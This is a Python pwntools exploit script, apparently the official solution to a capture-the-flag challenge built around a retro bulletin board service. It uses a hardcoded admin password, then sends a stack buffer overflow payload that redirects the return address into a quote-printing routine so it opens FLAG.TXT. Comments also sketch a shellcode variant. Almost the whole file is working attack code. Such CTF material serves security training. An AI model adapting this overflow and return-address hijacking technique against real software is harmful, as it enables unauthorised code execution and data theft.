#!/usr/bin/env python

# EXPLOIT 1: Simple buffer overflow, no actual shellcode being used so it's
# more like ROP. Step 1 is to gain admin access to create a bulletin. In the
# bulletin we write a long single line string which overflows a buffer used
# when listing bulletins. The overflow redirects control to the quote
# printing feature, but instead of leading QUOTES.TXT it loads FLAG.TXT and
# prints it out.


# Alternatively:
#     - Code could be stored directly on the stack, or in the prompt buffer,
#       then return to some retf instruction which properly loads the CS with
#       SS and returns into the shellcode.

from pwn import *
import struct
import argparse

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host')
    ap.add_argument('port', type=int)
    args = ap.parse_args()
    # r = remote(args.host, args.port)
    r = process(['./wrapper_modem', args.host, str(args.port)])
    r.timeout = 20

    def check_recv(x):
        data = r.recvuntil(x)
        assert(x in data), ('Failed to recv %s' % (repr(x)))
        return data

    check_recv(b'name? ')
    r.send(b'NewUser\n')

    # Admin password
    print('Enabling admin')
    check_recv(b'Selection: ')
    r.send(b'supersneaky2020\n')
    
    # Put exploit in notes file
    print('Sending exploit')
    print(check_recv(b'Selection: '))
    r.send(b'C\n')
    addr_of_quote_func = 0xe97c
    quote_func_offset = 0xe
    stack_ptr_before_ret = 0xff8c
    exploit_msg = b''
    exploit_msg += (256+6)*b'A'    # Fill buffer + BP DI SI saved on stack
    exploit_msg += p16(addr_of_quote_func+quote_func_offset) # Return address, which is offset into quote function
    exploit_msg += p16(stack_ptr_before_ret+6) # Stack offset of FLAG.TXT string below
    exploit_msg += p16(0xbd5)     # Offset of 'rb' string
    exploit_msg += b'FLAG.TXT\x00' # Filename to open
    print('Sending:' + repr(exploit_msg))
    r.send(exploit_msg)
    r.send(b'\n\n')

    # Trigger execution of exploit
    print('Triggering exploit')
    check_recv(b'Selection: ')
    r.send('L\n')
    contents = check_recv(b'OOO{')
    if b'OOO' not in contents:
        print('ERROR: Did not get flag!')
        print('Output: ' + repr(contents))
        assert False
    flag_contents = r.recvuntil(b'}')
    print('FLAG: ' + (b'OOO{' + flag_contents).decode('utf-8'))

if __name__ == '__main__':
    main()
